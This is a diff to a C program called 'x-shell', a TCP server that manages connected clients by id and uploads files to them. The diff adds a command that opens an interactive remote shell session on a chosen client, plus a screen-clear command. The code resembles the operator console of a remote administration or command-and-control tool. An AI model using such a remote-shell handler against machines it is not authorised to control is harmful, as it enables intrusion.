@@ -45,6 +45,7 @@ void print_help()
         "  upload <cid> <HFILE> <SAVELOCATION>     upload the HFILE from the Host to client with <cid> id and save it to SAVELOCATION\n"
         "  close <cid>                             close the connection to client with <cid> id\n"
         "  help                                    show programs options\n"
+        "  clear                                   clear screen\n"
         "  exit                                    exit the x-shell\n\n";
 
     printf("%s", xshell_help);
@@ -64,19 +65,78 @@ void *accept_worker(void *arg)
             break;
         }
         tmp_client.socket = client_socket;
+        xtcpsocket_init_communication(&tmp_client.socket);
         xclient_list_push_back(&list, &tmp_client);
     }
     xtcpsocket_close(server_socket);
 }
+
+int exec_shell_command()
+{
+    uint16_t cid;
+    scanf("%hu", &cid);
+    xclient_t *target_client = xclient_list_find(&list, cid);
+    if (target_client == NULL)
+    {
+        printf("Client with %hu id didn't find!\r\n", cid);
+        return -1;
+    }
+
+    // // REQUEST A NEW SHELL SESSION
+
+    if (xterminal_enable_raw_mode() == -1)
+    {
+        fprintf(stderr,
+                "[!] xterminal_enable_raw_mode() failed\n\r");
+        // xterminal_reset();
+        return -1;
+    }
+
+    if (xshell_start(&target_client->socket, REQUESTER) == -1)
+    {
+        fprintf(stderr,
+                "[!] xshell_start() failed\n\r");
+        // xterminal_reset();
+        return -1;
+    }
+    // fprintf(stderr, "[+] xshell started successfully!\n");
+
+    if (xshell_wait() == -1)
+    {
+        fprintf(stderr,
+                "[!] xshell_wait() failed\n\r");
+        // xterminal_reset();
+        return -1;
+    }
+    // fprintf(stderr, "[+] xshell session waite finished!\n");
+
+    if (xshell_finish() == -1)
+    {
+        fprintf(stderr,
+                "[!] xshell_finish() failed\n\r");
+        // xterminal_reset();
+
+        return -1;
+    }
+    if (xterminal_disable_raw_mode() == -1)
+    {
+        fprintf(stderr,
+                "[!] xterminal_disable_raw_mode() failed\n\r");
+        return -1;
+    }
+    // fprintf(stderr, "[+] xshell finished succesffuly finished!\n");
+    xterminal_reset();
+    return 0;
+}
 int main()
 {
 
-    if (freopen("./xshell.log", "w", stderr) == NULL)
-    {
-        fprintf(stderr,
-                "[!] freopen() faild to open xshell.log: %s\r\n",
-                strerror(errno));
-    }
+    // if (freopen("./xshell.log", "w", stderr) == NULL)
+    // {
+    //     fprintf(stderr,
+    //             "[!] freopen() faild to open xshell.log: %s\r\n",
+    //             strerror(errno));
+    // }
     // Register clean up for exiting
     atexit(&cleanup);
     xclient_list_create(&list);
@@ -122,6 +182,13 @@ int main()
         else if (!strcmp(command, "help"))
         {
             print_help();
+        }
+        else if (!strcmp(command, "shell"))
+        {
+            exec_shell_command();
+        }
+        else if(!strcmp(command,"clear")){
+            system("clear || cls");
         }
     } while (strcmp(command, "exit"));
     isProgramRunning = 0;
